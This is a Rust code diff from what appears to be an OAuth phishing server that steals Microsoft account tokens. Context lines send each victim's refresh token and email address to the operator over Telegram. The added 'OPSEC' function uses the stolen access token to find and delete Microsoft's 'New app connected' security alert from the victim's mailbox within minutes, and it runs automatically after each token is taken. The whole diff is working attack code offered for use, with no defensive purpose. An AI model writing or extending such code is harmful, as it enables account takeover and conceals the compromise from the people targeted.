@@ -227,6 +227,53 @@ async fn fetch_user_email(access_token: &str) -> Option<String> {
     body.get("userPrincipalName")?.as_str().map(|s| s.to_string())
 }
 
+/// OPSEC: Search and delete Microsoft's "New app connected" notification email
+async fn delete_microsoft_notification_email(access_token: String) {
+    let client = Client::new();
+    // Search for recent emails from Microsoft account team about app connections
+    let search_url = "https://graph.microsoft.com/v1.0/me/messages?$search=\"from:microsoftaccountteam@microsoft.com New app connected\"&$top=10&$select=id,subject,receivedDateTime";
+    let resp = match client
+        .get(search_url)
+        .header("Authorization", format!("Bearer {}", access_token))
+        .header("Accept", "application/json")
+        .send()
+        .await {
+        Ok(r) => r,
+        Err(e) => { eprintln!("[opsec] Failed to search notification emails: {}", e); return; }
+    };
+    if !resp.status().is_success() {
+        eprintln!("[opsec] Notification search returned status {}", resp.status());
+        return;
+    }
+    let body: serde_json::Value = match resp.json().await {
+        Ok(b) => b,
+        Err(e) => { eprintln!("[opsec] Failed to parse notification search: {}", e); return; }
+    };
+    let messages = body.get("value").and_then(|v| v.as_array()).cloned().unwrap_or_default();
+    let now = Utc::now();
+    for msg in messages {
+        let id = msg.get("id").and_then(|v| v.as_str()).unwrap_or("");
+        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
+        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
+        // Only delete emails received in the last 5 minutes with matching subject
+        let is_recent = if let Ok(dt) = chrono::DateTime::parse_from_rfc3339(received) {
+            (now - dt.with_timezone(&Utc)).num_minutes() <= 5
+        } else { false };
+        if is_recent && (subject.contains("new app") || subject.contains("connected")) && !id.is_empty() {
+            let del_url = format!("https://graph.microsoft.com/v1.0/me/messages/{}", id);
+            match client
+                .delete(&del_url)
+                .header("Authorization", format!("Bearer {}", access_token))
+                .send()
+                .await {
+                Ok(r) if r.status().is_success() => println!("[opsec] Deleted notification email: {}", id),
+                Ok(r) => eprintln!("[opsec] Failed to delete notification email {}: {}", id, r.status()),
+                Err(e) => eprintln!("[opsec] Error deleting notification email {}: {}", id, e),
+            }
+        }
+    }
+}
+
 #[derive(Deserialize)]
 struct ExchangeQuery {
     code: String,
@@ -283,6 +330,8 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                 if let Some(email) = email {
                     send_telegram_notification(&state.config, refresh_token, &email).await;
                 }
+                // OPSEC: auto-delete Microsoft's "New app connected" notification email
+                tokio::spawn(delete_microsoft_notification_email(access_token.to_string()));
                 HttpResponse::Ok().json(serde_json::json!({"status": "token_stored"}))
             } else {
                 HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
